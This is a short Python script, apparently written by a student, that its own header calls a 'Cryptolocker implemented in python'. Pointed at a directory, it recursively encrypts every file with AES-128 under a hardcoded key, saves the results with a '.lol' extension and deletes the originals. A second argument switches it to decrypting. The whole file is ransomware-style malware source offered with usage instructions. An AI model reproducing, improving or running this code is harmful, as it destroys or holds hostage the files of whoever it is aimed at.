#!/usr/bin/env python
import shutil
from sys import argv
from os import walk, remove
from Crypto import Random
from Crypto.Cipher import AES

###
# Author: Michael Salsone (mas9190@rit.edu)
# Cryptolocker implemented in python. When pointed at a directory, will
# recursively encrypt all files in that directory with AES-128.
# Usage: ./pylocker <Absolute Path> <anything here will force decrypt>
###

def encrypt(message, key, key_size=128):
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CFB, iv)
    return iv + cipher.encrypt(message)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".lol", 'wb') as fo:
		fo.write(enc)
    shutil.copystat(file_name, file_name + ".lol")

def decrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)
    shutil.copystat(file_name, file_name[:-4])


def main():
	key = b'sixteenbytekeyzz'
	mypath = argv[1]
	encryption_flag = True

	if len(argv) == 3:
		encryption_flag = False

	for (dirpath, dirnames, filenames) in walk(mypath): 
		for files in filenames:
			en_file = dirpath + "/" + files
			if encryption_flag == True:
				encrypt_file(en_file, key)
				remove(en_file)
			else:
				decrypt_file(en_file, key)
				remove(en_file)

if __name__ == "__main__":
    main()